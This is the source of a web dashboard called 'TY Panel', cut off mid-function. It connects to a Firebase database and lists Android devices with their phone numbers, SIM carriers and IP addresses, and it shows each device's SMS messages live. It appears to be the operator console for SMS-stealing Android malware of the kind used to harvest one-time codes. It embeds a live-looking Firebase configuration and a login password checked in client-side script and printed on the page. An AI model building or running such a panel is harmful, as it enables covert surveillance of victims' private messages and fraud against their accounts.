<?php header('Content-Type: text/html; charset=UTF-8'); ?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>TY Panel — Device Dashboard</title>
  <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;600;800&display=swap" rel="stylesheet"/>
  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
  <style>
    :root{--bg:#050810;--surface:#0c1018;--card:#111827;--border:#243044;--accent:#22d3ee;--accent2:#38bdf8;--text:#e5eef8;--muted:#7b8ba3;--success:#34d399;--error:#f87171;--glow:rgba(34,211,238,0.35)}
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text);min-height:100vh}
    body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(34,211,238,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(34,211,238,0.03) 1px,transparent 1px);background-size:40px 40px;pointer-events:none;z-index:0}
    .wrap{position:relative;z-index:1;min-height:100vh;display:flex;flex-direction:column}
    header{display:flex;align-items:center;justify-content:space-between;padding:14px 22px;border-bottom:1px solid var(--border);background:rgba(12,16,24,0.92);backdrop-filter:blur(10px);position:sticky;top:0;z-index:20}
    .logo{display:flex;align-items:center;gap:12px}
    .logo-mark{width:36px;height:36px;border-radius:10px;background:linear-gradient(135deg,rgba(34,211,238,0.2),rgba(56,189,248,0.08));border:1px solid rgba(34,211,238,0.35);display:flex;align-items:center;justify-content:center;font-weight:800;color:var(--accent)}
    .logo-title{font-size:18px;font-weight:800;letter-spacing:-0.5px}
    .logo-sub{font-family:'Space Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:1px;margin-top:2px}
    .status-pill{display:flex;align-items:center;gap:8px;padding:7px 12px;border-radius:999px;border:1px solid var(--border);background:var(--surface);font-family:'Space Mono',monospace;font-size:10px;color:var(--muted)}
    .status-dot{width:7px;height:7px;border-radius:50%;background:var(--error);animation:pulse 1.8s infinite}
    .status-pill.connected .status-dot{background:var(--success)}
    @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.45}}
    .main-layout{display:flex;flex:1;min-height:0}
    .sidebar{width:320px;min-width:280px;border-right:1px solid var(--border);background:rgba(12,16,24,0.75);display:flex;flex-direction:column}
    .sidebar-hdr{padding:16px 18px;border-bottom:1px solid var(--border)}
    .sidebar-title{font-size:13px;font-weight:800;margin-bottom:10px}
    .stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}
    .stat{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:8px;text-align:center}
    .stat-val{font-size:16px;font-weight:800}
    .stat-val.on{color:var(--success)} .stat-val.off{color:var(--error)}
    .stat-lbl{font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);margin-top:2px}
    .search{padding:12px 18px;border-bottom:1px solid var(--border)}
    .search input{width:100%;padding:10px 12px;border-radius:10px;border:1px solid var(--border);background:var(--card);color:var(--text);font-family:'Space Mono',monospace;font-size:11px;outline:none}
    .search input:focus{border-color:rgba(34,211,238,0.5)}
    .dev-list{flex:1;overflow-y:auto;padding:10px}
    .dev-item{padding:12px;border-radius:12px;border:1px solid var(--border);background:var(--card);margin-bottom:8px;cursor:pointer;transition:all .2s}
    .dev-item:hover,.dev-item.active{border-color:rgba(34,211,238,0.45);box-shadow:0 0 18px rgba(34,211,238,0.08)}
    .dev-item.is-online{border-color:rgba(52,211,153,0.35)}
    .dev-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:6px}
    .dev-phone{font-size:12px;font-weight:800}
    .dev-dot{width:8px;height:8px;border-radius:50%;background:var(--error)}
    .dev-dot.online{background:var(--success);box-shadow:0 0 8px rgba(52,211,153,0.6)}
    .dev-meta{font-family:'Space Mono',monospace;font-size:9px;color:var(--muted)}
    .dev-empty{padding:30px 16px;text-align:center;color:var(--muted);font-family:'Space Mono',monospace;font-size:11px;line-height:1.6}
    .main-area{flex:1;min-width:0;display:flex;flex-direction:column}
    .empty-state{flex:1;display:flex;align-items:center;justify-content:center;flex-direction:column;color:var(--muted);gap:10px}
    .empty-state .icon{font-size:42px;opacity:0.7}
    .device-detail{display:none;flex:1;flex-direction:column;min-height:0}
    .device-detail.show{display:flex}
    .hero{padding:18px 22px;border-bottom:1px solid var(--border);background:linear-gradient(180deg,rgba(17,24,39,0.95),rgba(12,16,24,0.6))}
    .hero-top{display:flex;justify-content:space-between;align-items:flex-start;gap:12px;margin-bottom:14px}
    .hero-name{font-size:20px;font-weight:800}
    .hero-brand{font-size:11px;color:var(--muted);margin-top:4px}
    .hero-id{font-family:'Space Mono',monospace;font-size:9px;color:var(--muted);margin-top:6px}
    .badge{padding:6px 12px;border-radius:999px;font-family:'Space Mono',monospace;font-size:10px;font-weight:700;border:1px solid var(--border)}
    .badge.online{color:var(--success);border-color:rgba(52,211,153,0.35);background:rgba(52,211,153,0.08)}
    .badge.offline{color:var(--muted)}
    .metrics{display:grid;grid-template-columns:repeat(5,minmax(0,1fr));gap:10px}
    .metric{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:10px}
    .metric-lbl{font-family:'Space Mono',monospace;font-size:8px;color:var(--muted);margin-bottom:4px}
    .metric-val{font-size:13px;font-weight:800}
    .tabs{display:flex;gap:8px;padding:14px 22px 0;border-bottom:1px solid var(--border);flex-wrap:wrap}
    .tab{padding:10px 14px;border:none;border-radius:10px 10px 0 0;background:transparent;color:var(--muted);font-family:'Syne',sans-serif;font-weight:700;font-size:12px;cursor:pointer;border-bottom:2px solid transparent}
    .tab.active{color:var(--accent);border-bottom-color:var(--accent);background:rgba(34,211,238,0.06)}
    .panel{display:none;flex:1;overflow:auto;padding:18px 22px 24px}
    .panel.active{display:block}
    .panel-head{display:flex;justify-content:space-between;align-items:center;gap:10px;margin-bottom:14px;flex-wrap:wrap}
    .panel-title{font-size:15px;font-weight:800}
    .panel-title span{color:var(--accent)}
    .tbl-wrap{border:1px solid var(--border);border-radius:12px;overflow:hidden;background:var(--card)}
    table{width:100%;border-collapse:collapse;font-size:11px}
    th,td{padding:10px 12px;text-align:left;border-bottom:1px solid var(--border)}
    th{font-family:'Space Mono',monospace;font-size:9px;color:var(--muted);background:rgba(0,0,0,0.2)}
    tr:last-child td{border-bottom:none}
    tr:hover td{background:rgba(34,211,238,0.03)}
    .tbl-empty{text-align:center;color:var(--muted);padding:24px;font-family:'Space Mono',monospace;font-size:10px}
    .mono{font-family:'Space Mono',monospace}
    .sbadge{display:inline-block;padding:2px 8px;border-radius:999px;font-family:'Space Mono',monospace;font-size:8px;text-transform:uppercase}
    .sbadge.incoming,.sbadge.inbox{background:rgba(52,211,153,0.12);color:var(--success)}
    .sbadge.outgoing,.sbadge.sent{background:rgba(56,189,248,0.12);color:var(--accent2)}
    .new-tag{margin-left:6px;background:rgba(34,211,238,0.15);color:var(--accent);font-size:8px;padding:1px 6px;border-radius:8px;font-family:'Space Mono',monospace}
    .sim-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:10px}
    .sim-card{border:1px solid var(--border);border-radius:12px;padding:14px;background:var(--card)}
    .sim-row{display:flex;justify-content:space-between;gap:10px;padding:8px 0;border-bottom:1px solid var(--border);font-size:11px}
    .sim-row:last-child{border-bottom:none}
    .sim-key{color:var(--muted);font-family:'Space Mono',monospace;font-size:9px}
    .sim-val{font-weight:700;text-align:right;word-break:break-word}
    .fetch-ms{font-family:'Space Mono',monospace;font-size:9px;color:var(--accent2);margin-left:8px}
    #loginPage{position:fixed;inset:0;z-index:100;display:flex;align-items:center;justify-content:center;background:rgba(5,8,16,0.96);padding:20px}
    #loginPage.hidden{display:none}
    .login-card{width:100%;max-width:400px;background:var(--card);border:1px solid var(--border);border-radius:18px;padding:28px;box-shadow:0 20px 60px rgba(0,0,0,0.45)}
    .login-card h2{font-size:22px;font-weight:800;margin:16px 0 6px}
    .login-card h2 span{color:var(--accent)}
    .login-sub{color:var(--muted);font-size:12px;margin-bottom:18px}
    .login-error{display:none;background:rgba(248,113,113,0.12);border:1px solid rgba(248,113,113,0.35);color:var(--error);padding:10px 12px;border-radius:10px;font-size:11px;margin-bottom:12px}
    label{display:block;font-family:'Space Mono',monospace;font-size:9px;color:var(--muted);margin-bottom:6px;letter-spacing:0.5px}
    input[type=text],input[type=password]{width:100%;padding:11px 12px;border-radius:10px;border:1px solid var(--border);background:var(--surface);color:var(--text);font-family:'Space Mono',monospace;font-size:12px;outline:none;margin-bottom:14px}
    input:focus{border-color:rgba(34,211,238,0.45)}
    .remember{display:flex;align-items:center;gap:8px;margin-bottom:16px;font-size:11px;color:var(--muted)}
    .btn{width:100%;padding:12px;border:none;border-radius:10px;background:linear-gradient(135deg,#0891b2,#22d3ee);color:#041018;font-family:'Syne',sans-serif;font-weight:800;font-size:13px;cursor:pointer}
    .btn:hover{filter:brightness(1.05)}
    .login-hint{margin-top:14px;text-align:center;font-family:'Space Mono',monospace;font-size:9px;color:var(--muted)}
    .modal{position:fixed;inset:0;background:rgba(0,0,0,0.75);display:flex;align-items:center;justify-content:center;z-index:200;padding:20px}
    .modal.hidden{display:none}
    .modal-box{max-width:520px;width:100%;background:var(--card);border:1px solid var(--border);border-radius:16px;padding:20px}
    .modal-box h3{margin-bottom:8px}
    .modal-meta{font-family:'Space Mono',monospace;font-size:10px;color:var(--muted);margin-bottom:12px}
    .modal-body{white-space:pre-wrap;line-height:1.55;font-size:12px;max-height:50vh;overflow:auto}
    .toast-wrap{position:fixed;bottom:18px;right:18px;z-index:300;display:flex;flex-direction:column;gap:8px}
    .toast{padding:10px 14px;border-radius:10px;background:var(--card);border:1px solid var(--border);font-size:11px;animation:toastIn .25s ease}
    .toast.success{border-color:rgba(52,211,153,0.35)}
    .toast.error{border-color:rgba(248,113,113,0.35)}
    @keyframes toastIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
    footer{padding:10px 22px;border-top:1px solid var(--border);font-family:'Space Mono',monospace;font-size:9px;color:var(--muted);display:flex;justify-content:space-between}
    @media(max-width:900px){.sidebar{width:100%;max-height:42vh;border-right:none;border-bottom:1px solid var(--border)}.main-layout{flex-direction:column}.metrics{grid-template-columns:repeat(2,minmax(0,1fr))}}
  </style>
</head>
<body>
<div id="loginPage">
  <div class="login-card">
    <div class="logo">
      <div class="logo-mark">TY</div>
      <div><div class="logo-title">TY Panel</div><div class="logo-sub">DEVICE DASHBOARD</div></div>
    </div>
    <h2>User <span>Login</span></h2>
    <p class="login-sub">Sign in to view connected devices and messages.</p>
    <div id="loginError" class="login-error">Invalid username or password.</div>
    <label for="loginUser">Username</label>
    <input type="text" id="loginUser" placeholder="tyuser" autocomplete="username"/>
    <label for="loginPass">Password</label>
    <input type="password" id="loginPass" placeholder="Enter password" autocomplete="current-password"/>
    <div class="remember"><input type="checkbox" id="rememberMe"/><label for="rememberMe" style="margin:0">Remember me</label></div>
    <button class="btn" onclick="doLogin()">Sign In</button>
    <div class="login-hint">Default: tyuser / TyPanel2026</div>
  </div>
</div>

<div class="wrap" id="appWrap" style="display:none">
  <header>
    <div class="logo">
      <div class="logo-mark">TY</div>
      <div><div class="logo-title">TY Panel</div><div class="logo-sub">TYHUMAI · LIVE DEVICES</div></div>
    </div>
    <div class="status-pill" id="statusPill"><div class="status-dot"></div><span id="statusText">Connecting...</span></div>
  </header>

  <div class="main-layout">
    <aside class="sidebar">
      <div class="sidebar-hdr">
        <div class="sidebar-title">Devices <span id="fetchMs" class="fetch-ms"></span></div>
        <div class="stats">
          <div class="stat"><div class="stat-val" id="stTotal">0</div><div class="stat-lbl">TOTAL</div></div>
          <div class="stat"><div class="stat-val on" id="stOnline">0</div><div class="stat-lbl">ONLINE</div></div>
          <div class="stat"><div class="stat-val off" id="stOffline">0</div><div class="stat-lbl">OFFLINE</div></div>
        </div>
      </div>
      <div class="search"><input id="devSearch" placeholder="Search phone, model, device id..." oninput="renderSidebar()"/></div>
      <div class="dev-list" id="devList"><div class="dev-empty">No devices connected yet.<br>Waiting for Firebase data...</div></div>
    </aside>

    <main class="main-area">
      <div class="empty-state" id="emptyState">
        <div class="icon">📱</div>
        <div>Select a device to view details</div>
      </div>
      <div class="device-detail" id="deviceDetail">
        <div class="hero">
          <div class="hero-top">
            <div>
              <div class="hero-name" id="dName">—</div>
              <div class="hero-brand" id="dBrand">—</div>
              <div class="hero-id" id="dId">—</div>
            </div>
            <div class="badge offline" id="dBadge">OFFLINE</div>
          </div>
          <div class="metrics">
            <div class="metric"><div class="metric-lbl">BATTERY</div><div class="metric-val" id="dBat">—</div></div>
            <div class="metric"><div class="metric-lbl">NETWORK</div><div class="metric-val" id="dNet">—</div></div>
            <div class="metric"><div class="metric-lbl">ANDROID</div><div class="metric-val" id="dAndroid">—</div></div>
            <div class="metric"><div class="metric-lbl">STORAGE</div><div class="metric-val" id="dStorage">—</div></div>
            <div class="metric"><div class="metric-lbl">LAST SEEN</div><div class="metric-val" id="dLastSeen">—</div></div>
          </div>
        </div>
        <div class="tabs">
          <button class="tab active" data-tab="sms" onclick="switchTab('sms',this)">SMS <span id="tc-sms" class="mono">0</span></button>
          <button class="tab" data-tab="sim" onclick="switchTab('sim',this)">Device Info</button>
        </div>
        <div class="panel active" id="tab-sms">
          <div class="panel-head">
            <div class="panel-title">SMS <span>Messages</span></div>
            <input class="search" style="padding:0;border:none;max-width:220px" placeholder="Search messages..." oninput="filterRows('smsTbody',this.value)"/>
          </div>
          <div class="tbl-wrap">
            <table><thead><tr><th>#</th><th>Sender</th><th>Message</th><th>Date</th><th>Type</th></tr></thead>
            <tbody id="smsTbody"><tr><td colspan="5" class="tbl-empty">No SMS data yet</td></tr></tbody></table>
          </div>
        </div>
        <div class="panel" id="tab-sim">
          <div class="panel-head"><div class="panel-title">Device <span>Information</span></div></div>
          <div class="sim-grid" id="simGrid"><div class="tbl-empty">Loading...</div></div>
        </div>
      </div>
    </main>
  </div>
  <footer><span>TY Panel · tyhumai-299f1</span><span id="footerTime">—</span></footer>
</div>

<div class="modal hidden" id="smsModal" onclick="closeSmsModal(event)">
  <div class="modal-box" onclick="event.stopPropagation()">
    <h3 id="modalFrom">From</h3>
    <div class="modal-meta" id="modalDate">—</div>
    <div class="modal-body" id="modalBody"></div>
  </div>
</div>
<div class="toast-wrap" id="toastWrap"></div>

<script>
var AU='tyuser', AP='TyPanel2026';
var FB_CFG={
  id:'tyhumai_299f1',
  name:'TYHUMAI',
  schema:'rabel',
  apiKey:'AIzaSyAMbUTWtq5dd--U9-oyGo1nzSEJ3fR7vus',
  authDomain:'tyhumai-299f1.firebaseapp.com',
  databaseURL:'https://tyhumai-299f1-default-rtdb.asia-southeast1.firebasedatabase.app',
  projectId:'tyhumai-299f1',
  storageBucket:'tyhumai-299f1.firebasestorage.app',
  messagingSenderId:'857512919356',
  appId:'1:857512919356:android:292ec32a0f74c34615de39'
};

var db=null, clientsRawMap={}, allDevs=[], selDev='', activeListeners={};
var tabLoaded={}, panelReady=false, fetchStartMs=0, firstFetchDone=false;
var _allSmsData=[], _newSmsData=[], _smsSeenKeys={}, _smsHydrated=false;

function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
function showToast(type,msg){
  var w=document.getElementById('toastWrap'), d=document.createElement('div');
  d.className='toast '+type; d.textContent=msg; w.appendChild(d);
  setTimeout(function(){d.remove();},2800);
}
function setStatus(ok,text){
  var p=document.getElementById('statusPill');
  p.className='status-pill'+(ok?' connected':'');
  document.getElementById('statusText').textContent=text;
}
function restJson(url){return fetch(url,{cache:'no-store'}).then(function(r){return r.json();}).catch(function(){return null;});}

function initFirebase(){
  try{
    firebase.initializeApp({
      apiKey:FB_CFG.apiKey,
      authDomain:FB_CFG.authDomain,
      databaseURL:FB_CFG.databaseURL,
      projectId:FB_CFG.projectId,
      storageBucket:FB_CFG.storageBucket,
      messagingSenderId:FB_CFG.messagingSenderId,
      appId:FB_CFG.appId
    });
    db=firebase.database();
    db.ref('.info/connected').on('value',function(s){
      setStatus(!!s.val(), s.val()?'Connected · Live':'Reconnecting...');
    });
  }catch(e){
    console.error(e);
    setStatus(false,'Firebase init failed');
    showToast('error','Could not connect to Firebase');
  }
}

function parseBattery(v){
  if(v==null) return 0;
  if(typeof v==='number') return v;
  return parseInt(String(v).replace('%',''),10)||0;
}
function parseJoinedDate(str){
  if(!str) return 0;
  try{
    var p=String(str).split('|')[0].trim().split('/');
    if(p.length===3) return new Date(parseInt(p[2],10),parseInt(p[1],10)-1,parseInt(p[0],10)).getTime();
  }catch(e){}
  return 0;
}
function getPhoneFromRecord(s){
  if(!s||typeof s!=='object') return '';
  if(s.mobNo) return String(s.mobNo).trim();
  if(s.sims&&s.sims.length&&s.sims[0].phoneNumber) return String(s.sims[0].phoneNumber).trim();
  return '';
}
function isValidDeviceRecord(raw){
  if(!raw||typeof raw!=='object'||Array.isArray(raw)) return false;
  if(raw.password||raw.Pass||raw.expiry||raw.userName) return false;
  if(raw.message&&raw.sender&&raw.dateTime) return false;
  if(typeof raw.status==='boolean') return true;
  if(!raw.modelName&&!raw.deviceId&&!raw.device_model&&!raw.name) return false;
  return true;
}
function normalizeClientRecord(raw){
  if(!isValidDeviceRecord(raw)) return null;
  if(raw.modelName||raw.deviceId||raw.mobNo){
    var mob=getPhoneFromRecord(raw);
    return{
      name:raw.modelName||'Unknown',
      brand:raw.brand||(raw.modelName?String(raw.modelName).split(' ')[0]:''),
      android:raw.androidV||raw.sdkV||'',
      ts:parseJoinedDate(raw.joined)||raw.ts||0,
      online:raw.status===true,
      battery:parseBattery(raw.battery),
      network:raw.service_provider||(raw.sims&&raw.sims[0]?raw.sims[0].carrierName:'')||'—',
      mobNo:mob||raw.mobNo||'',
      ip:raw.ip_address||'',
      storage:raw.storage||''
    };
  }
  return{
    name:raw.name||raw.device_model||raw.model||raw._devId||'Device',
    brand:raw.brand||'',
    android:raw.android||raw.androidV||'',
    ts:raw.ts||0,
    online:raw.status===true||raw.online===true,
    battery:parseBattery(raw.battery),
    network:raw.network||raw.service_provider||'—',
    mobNo:getPhoneFromRecord(raw),
    ip:raw.ip_address||'',
    storage:raw.storage||''
  };
}
function ingestDevice(devId,data){
  var payload=Object.assign({_devId:devId},data||{});
  if(!payload.modelName&&!payload.name&&!payload.deviceId) payload.name=String(devId).substring(0,16);
  var norm=normalizeClientRecord(payload);
  if(!norm) return;
  clientsRawMap[devId]=norm;
}
function processClients(){
  allDevs=[];
  Object.keys(clientsRawMap).forEach(function(id){
    var s=clientsRawMap[id];
    var phone=getPhoneFromRecord(s);
    allDevs.push({
      id:id,
      name:s.name||'Unknown',
      displayPhone:phone||'No Number',
      brand:s.brand||'',
      android:s.android||'',
      status:(s.online?'online':'offline'),
      battery:s.battery||0,
      network:s.network||'—',
      storage:s.storage||'—',
      ip:s.ip||'',
      lastSeen:s.ts||0
    });
  });
  allDevs.sort(function(a,b){
    if(a.status==='online'&&b.status!=='online') return -1;
    if(a.status!=='online'&&b.status==='online') return 1;
    return b.lastSeen-a.lastSeen;
  });
  if(!selDev&&allDevs.length) selDev=allDevs[0].id;
  if(selDev&&!allDevs.find(function(d){return d.id===selDev;})) selDev=allDevs.length?allDevs[0].id:'';
  renderSidebar();
  updateStats();
  if(selDev&&document.getElementById('deviceDetail').classList.contains('show')){
    var dev=allDevs.find(function(d){return d.id===selDev;});
    if(dev) updateHero(dev);
  }
}
function updateStats(){
  var on=allDevs.filter(function(d){return d.status==='online';}).length;
  document.getElementById('stTotal').textContent=allDevs.length;
  document.getElementById('stOnline').textContent=on;
  document.getElementById('stOffline').textContent=allDevs.length-on;
}
function renderSidebar(){
  var el=document.getElementById('devList');
  var q=(document.getElementById('devSearch').value||'').toLowerCase();
  var list=allDevs.filter(function(d){
    return !q||(d.displayPhone+d.name+d.id+d.brand).toLowerCase().includes(q);
  });
  if(!list.length){
    el.innerHTML='<div class="dev-empty">No devices found.<br>Devices appear when the app connects to Firebase.</div>';
    return;
  }
  window._sidebarList=list;
  el.innerHTML=list.map(function(d,i){
    return '<div class="dev-item'+(d.status==='online'?' is-online':'')+(d.id===selDev?' active':'')+'" onclick="openDeviceByIdx('+i+')">'+
      '<div class="dev-top"><span class="dev-phone">'+esc(d.displayPhone)+'</span><span class="dev-dot '+(d.status==='online'?'online':'')+'"></span></div>'+
      '<div class="dev-meta">'+esc(d.name)+' · '+esc(d.id.substring(0,16))+'</div></div>';
  }).join('');
}
function openDeviceByIdx(i){openDevice(window._sidebarList[i].id);}
function openDevice(id){
  if(selDev===id&&tabLoaded.sms){
    var dev=allDevs.find(function(d){return d.id===id;});
    if(dev) updateHero(dev);
    return;
  }
  selDev=id;
  renderSidebar();
  document.getElementById('emptyState').style.display='none';
  document.getElementById('deviceDetail').classList.add('show');
  clearDeviceListeners();
  tabLoaded={};
  _allSmsData=[]; _newSmsData=[]; _smsSeenKeys={}; _smsHydrated=false;
  renderSmsList();
  var dev=allDevs.find(function(d){return d.id===id;});
  if(dev) updateHero(dev);
  ensureTab('sms');
}
function updateHero(d){
  document.getElementById('dName').textContent=d.displayPhone!=='No Number'?d.displayPhone+(d.brand?' ('+d.brand+')':''):d.name;
  document.getElementById('dBrand').textContent='Android '+d.android+' · '+FB_CFG.name;
  document.getElementById('dId').textContent='Device ID: '+d.id;
  var badge=document.getElementById('dBadge');
  badge.className='badge '+(d.status==='online'?'online':'offline');
  badge.textContent=d.status==='online'?'● ONLINE':'○ OFFLINE';
  document.getElementById('dBat').textContent=(d.battery||0)+'%';
  document.getElementById('dNet').textContent=d.network;
  document.getElementById('dAndroid').textContent=d.android||'—';
  document.getElementById('dStorage').textContent=d.storage||'—';
  if(d.status==='online'){
    document.getElementById('dLastSeen').textContent='Active now';
    document.getElementById('dLastSeen').style.color='var(--success)';
  }else{
    var diff=Date.now()-d.lastSeen;
    document.getElementById('dLastSeen').textContent=!d.lastSeen?'—':diff<60000?Math.floor(diff/1000)+'s ago':diff<3600000?Math.floor(diff/60000)+'m ago':Math.floor(diff/3600000)+'h ago';
    document.getElementById('dLastSeen').style.color='var(--muted)';
  }
}
function switchTab(tab,btn){
  document.querySelectorAll('.tab').forEach(function(t){t.classList.remove('active');});
  document.querySelectorAll('.panel').forEach(function(p){p.classList.remove('active');});
  btn.classList.add('active');
  document.getElementById('tab-'+tab).classList.add('active');
  ensureTab(tab);
}
function clearDeviceListeners(){
  Object.keys(activeListeners).forEach(function(k){
    var L=activeListeners[k];
    if(L.timer) clearInterval(L.timer);
    else if(L.ref&&L.handler) L.ref.off('value',L.handler);
  });
  activeListeners={};
}
function devListen(path,cb){
  if(!db) return;
  var ref=db.ref(path), handler=function(s){cb(s.val());};
  var key='dev::'+path;
  activeListeners[key]={ref:ref,handler:handler};
  ref.on('value',handler);
}
function restPoll(path,cb,ms){
  var base=FB_CFG.databaseURL.replace(/\/$/,'');
  function tick(){restJson(base+'/'+path+'.json').then(cb);}
  tick();
  activeListeners['rest::'+path]={timer:setInterval(tick,ms||4000)};
}
function ensureTab(tab){
  if(!selDev||tabLoaded[tab]) return;
  tabLoaded[tab]=true;
  if(tab==='sms') loadSms(selDev);
  if(tab==='sim') loadSim(selDev);
}
function parseDdMmYyyy(s){
  if(!s||typeof s!=='string') return 0;
  var m=String(s).trim().match(/^(\d{1,2})[\/\-](\d{1,2})[\/\-](\d{4})(?:\s*[|\s]\s*(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(AM|PM|am|pm)?)?$/i);
  if(!m) return 0;
  var dd=+m[1], MM=+m[2], yyyy=+m[3], hh=+(m[4]||0), mi=+(m[5]||0), ss=+(m[6]||0), ap=m[7];
  if(ap){var p=ap.toUpperCase(); if(p==='PM'&&hh<12)hh+=12; if(p==='AM'&&hh===12)hh=0;}
  var t=new Date(yyyy,MM-1,dd,hh,mi,ss).getTime();
  return isNaN(t)?0:t;
}
function smsToMs(v){
  if(v==null||v==='') return 0;
  if(typeof v==='number'&&v>0) return v<1e12?v*1000:v;
  if(typeof v==='string'&&!isNaN(Number(v))&&Number(v)>0){var n=Number(v); return n<1e12?n*1000:n;}
  if(typeof v==='string'){
    var t=Date.parse(v); if(!isNaN(t)) return t;
    var d=parseDdMmYyyy(v); if(d) return d;
  }
  return 0;
}
function smsMsgTime(m){
  if(!m) return 0;
  var keys=['date','timestamp','dateTime','datetime','time','id'];
  for(var i=0;i<keys.length;i++){var ms=smsToMs(m[keys[i]]); if(ms) return ms;}
  return smsToMs(m.date_readable)||smsToMs(m._sortKey);
}
function normalizeSmsRecord(m){
  if(!m||typeof m!=='object') return null;
  var body=m.body||m.message||m.text||'';
  if(!body) return null;
  var ts=smsMsgTime(m);
  return{
    address:m.address||m.sender||m.from||'? ',
    body:body,
    date_readable:m.date_readable||m.dateTime||m.datetime||'—',
    type:String(m.type||'unknown').toLowerCase(),
    date:ts,
    _sortKey:m._sortKey||''
  };
}
function smsDedupKey(m){return String(m.date||0)+'|'+String(m.address||'')+'|'+String(m.body||'').slice(0,100);}
function smsSortDesc(a,b){
  var ta=a.date||0, tb=b.date||0;
  if(tb!==ta) return tb-ta;
  return String(b._sortKey||'').localeCompare(String(a._sortKey||''));
}
function ingestSmsData(data){
  var msgs=[];
  if(data&&typeof data==='object') Object.keys(data).forEach(function(k){
    var row=Object.assign({},data[k],{_sortKey:k});
    var n=normalizeSmsRecord(row);
    if(n){n._sortKey=k; msgs.push(n);}
  });
  var isInitial=!_smsHydrated, newMsgs=[];
  msgs.forEach(function(m){
    var sk=selDev+'::'+m._sortKey;
    if(!_smsSeenKeys[sk]){
      _smsSeenKeys[sk]=1;
      if(!isInitial) newMsgs.push(m);
    }
  });
  _smsHydrated=true;
  if(isInitial) _newSmsData=[];
  else if(newMsgs.length){
    var seen={};
    _newSmsData.concat(newMsgs).forEach(function(m){seen[smsDedupKey(m)]=m;});
    _newSmsData=Object.keys(seen).map(function(k){return seen[k];});
  }
  _allSmsData=msgs;
  renderSmsList();
}
function loadSms(devId){
  var path='messages/'+devId;
  if(db) devListen(path,ingestSmsData);
  else restPoll(path,ingestSmsData,3000);
}
function loadSim(devId){
  function render(data){
    var g=document.getElementById('simGrid');
    if(!data){g.innerHTML='<div class="tbl-empty">No device information available</div>';return;}
    var rows=[
      ['Model',data.modelName||'—'],['Mobile',data.mobNo||getPhoneFromRecord(data)||'—'],
      ['Battery',data.battery||'—'],['Network',data.service_provider||'—'],
      ['Storage',data.storage||'—'],['IP Address',data.ip_address||'—'],
      ['Android',data.androidV||data.sdkV||'—'],['Device ID',data.deviceId||devId]
    ];
    if(data.sims&&data.sims.length) data.sims.forEach(function(sim,i){
      rows.push(['SIM '+(i+1), (sim.carrierName||'—')+' · '+(sim.phoneNumber||'—')]);
    });
    g.innerHTML='<div class="sim-card">'+rows.map(function(r){
      return '<div class="sim-row"><span class="sim-key">'+esc(r[0])+'</span><span class="sim-val">'+esc(String(r[1]))+'</span></div>';
    }).join('')+'</div>';
  }
  if(db) devListen('clients/'+devId,render);
  else restPoll('clients/'+devId,render,5000);
}
function smsIsNew(s){return _newSmsData.some(function(n){return smsDedupKey(n)===smsDedupKey(s);});}
function renderSmsList(){
  var tb=document.getElementById('smsTbody');
  var merged=_allSmsData.slice().sort(smsSortDesc).slice(0,100);
  window._smsView=merged;
  document.getElementById('tc-sms').textContent=merged.length+' (latest 100)';
  if(!merged.length){
    tb.innerHTML='<tr><td colspan="5" class="tbl-empty">No SMS messages yet. Grant SMS permission on the device.</td></tr>';
    return;
  }
  tb.innerHTML=merged.map(function(s,i){
    var body=s.body.length>70?esc(s.body.substring(0,70))+'…':esc(s.body);
    return '<tr style="cursor:pointer" onclick="openSmsModal('+i+')"><td class="mono">'+(i+1)+'</td><td><b>'+esc(s.address)+'</b>'+(smsIsNew(s)?'<span class="new-tag">NEW</span>':'')+'</td><td>'+body+'</td><td class="mono">'+esc(s.date_readable)+'</td><td><span class="sbadge '+esc(s.type)+'">'+esc(s.type)+'</span></td></tr>';
  }).join('');
}
function openSmsModal(i){
  var s=(window._smsView||[])[i]; if(!s) return;
  document.getElementById('modalFrom').textContent='From: '+(s.address||'?');
  document.getElementById('modalDate').textContent=(s.date_readable||'—')+' · '+(s.type||'');
  document.getElementById('modalBody').textContent=s.body||'(empty)';
  document.getElementById('smsModal').classList.remove('hidden');
}
function closeSmsModal(e){if(e.target.id==='smsModal')document.getElementById('smsModal').classList.add('hidden');}
function filterRows(id,q){
  q=(q||'').toLowerCase();
  document.querySelectorAll('#'+id+' tr').forEach(function(r){r.style.display=r.textContent.toLowerCase().includes(q)?'':'none';});
}
function attachClientsLive(){
  if(!db){
    restPoll('clients',function(raw){
      if(!raw||typeof raw!=='object') return;
      Object.keys(raw).forEach(function(k){ingestDevice(k,raw[k]);});
      processClients();
      markFetchDone();
    },4000);
    return;
  }
  db.ref('clients').on('value',function(s){
    var raw=s.val();
    if(!raw||typeof raw!=='object'){clientsRawMap={}; processClients(); return;}
    Object.keys(raw).forEach(function(k){ingestDevice(k,raw[k]);});
    processClients();
    markFetchDone();
  });
}
function markFetchDone(){
  if(firstFetchDone) return;
  firstFetchDone=true;
  document.getElementById('fetchMs').textContent=Math.round(performance.now()-fetchStartMs)+'ms';
}
function openPanel(){
  if(panelReady) return;
  panelReady=true;
  document.getElementById('appWrap').style.display='flex';
  fetchStartMs=performance.now();
  initFirebase();
  attachClientsLive();
}
function doLogin(){
  var u=document.getElementById('loginUser').value.trim();
  var p=document.getElementById('loginPass').value;
  if(u===AU&&p===AP){
